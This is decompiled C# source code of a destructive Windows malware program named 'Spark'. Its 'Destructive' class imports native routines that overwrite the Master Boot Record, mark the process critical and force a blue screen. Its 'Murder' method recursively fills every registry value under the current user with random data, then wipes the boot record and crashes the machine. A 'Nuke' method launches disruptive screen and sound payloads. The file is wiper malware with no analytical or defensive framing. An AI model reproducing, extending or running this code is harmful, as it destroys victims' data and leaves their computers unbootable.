using System;
using System.Runtime.InteropServices;
using System.Threading.Tasks;
using Microsoft.Win32;

namespace Spark
{
	// Token: 0x02000003 RID: 3
	internal class Destructive
	{
		// Token: 0x06000004 RID: 4
		[DllImport("C:\\Windows\\File Cache\\DLL.dll", CharSet = CharSet.Unicode, EntryPoint = "?OverwriteMasterBootRecord@Export@SparkDLL@@QAEXXZ")]
		public static extern void OverwriteMasterBootRecord();

		// Token: 0x06000005 RID: 5
		[DllImport("C:\\Windows\\File Cache\\DLL.dll", CharSet = CharSet.Unicode, EntryPoint = "?CriticalMode@Export@SparkDLL@@QAE_NK@Z")]
		public static extern bool CriticalMode(ulong a);

		// Token: 0x06000006 RID: 6
		[DllImport("C:\\Windows\\File Cache\\DLL.dll", CharSet = CharSet.Unicode, EntryPoint = "?BasicBsod@Export@SparkDLL@@QAEXXZ")]
		public static extern void BasicBsod();

		// Token: 0x06000007 RID: 7 RVA: 0x0000216B File Offset: 0x0000036B
		public static void MemoryDump(int colour)
		{
			Driver.SendIOCTL(colour);
		}

		// Token: 0x06000008 RID: 8 RVA: 0x00002173 File Offset: 0x00000373
		public static void Murder()
		{
			Destructive.Corrupt(Registry.CurrentUser);
			Destructive.OverwriteMasterBootRecord();
			Destructive.MemoryDump(1);
		}

		// Token: 0x06000009 RID: 9 RVA: 0x0000218A File Offset: 0x0000038A
		public static void RandomScreenOfDeath()
		{
			Destructive.MemoryDump(new Random().Next(3) + 1);
		}

		// Token: 0x0600000A RID: 10 RVA: 0x000021A0 File Offset: 0x000003A0
		public static void Nuke()
		{
			Task.Run(delegate()
			{
				Standard.ErrorSounds();
			});
			Task.Run(delegate()
			{
				Standard.ShowAllWindows();
			});
			Task.Run(delegate()
			{
				Standard.SendMessagePayload();
			});
			Task.Run(delegate()
			{
				Standard.GlitchCards();
			});
			Task.Run(delegate()
			{
				Standard.ShootingStars();
			});
			Task.Run(delegate()
			{
				Standard.PrintRotate();
			});
		}

		// Token: 0x0600000B RID: 11 RVA: 0x0000228C File Offset: 0x0000048C
		public static void CorruptKey(RegistryKey key, string keyname)
		{
			Random random = new Random();
			string text = "";
			string text2 = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz";
			object obj = key.GetValue(keyname, null, RegistryValueOptions.DoNotExpandEnvironmentNames);
			switch (key.GetValueKind(keyname))
			{
			case RegistryValueKind.String:
			case RegistryValueKind.ExpandString:
				foreach (char c in (string)obj)
				{
					text += text2[random.Next(text2.Length + 1)].ToString();
				}
				obj = text;
				break;
			case RegistryValueKind.Binary:
			{
				byte[] array = (byte[])obj;
				for (int j = 0; j < array.Length; j++)
				{
					array[j] = (byte)random.Next(0, 256);
				}
				break;
			}
			case RegistryValueKind.DWord:
			case RegistryValueKind.QWord:
				obj = random.Next();
				break;
			case RegistryValueKind.MultiString:
			{
				string[] array2 = (string[])obj;
				for (int k = 0; k <= array2.Length; k++)
				{
					for (int l = 0; l < array2[k].Length; l++)
					{
						text += text2[random.Next(text2.Length + 1)].ToString();
					}
					array2[k] = text;
				}
				break;
			}
			}
			key.SetValue(keyname, obj, key.GetValueKind(keyname));
			key.Close();
		}

		// Token: 0x0600000C RID: 12 RVA: 0x00002400 File Offset: 0x00000600
		public static void GetSubkeysAndCorrupt(RegistryKey root)
		{
			foreach (string subkey in root.GetSubKeyNames())
			{
				try
				{
					Destructive.Corrupt(root.CreateSubKey(subkey));
				}
				catch (Exception)
				{
				}
			}
		}

		// Token: 0x0600000D RID: 13 RVA: 0x00002448 File Offset: 0x00000648
		public static void Corrupt(RegistryKey root)
		{
			Destructive.GetSubkeysAndCorrupt(root);
			foreach (string keyname in root.GetValueNames())
			{
				try
				{
					Destructive.CorruptKey(root, keyname);
				}
				catch (Exception)
				{
				}
			}
		}
	}
}
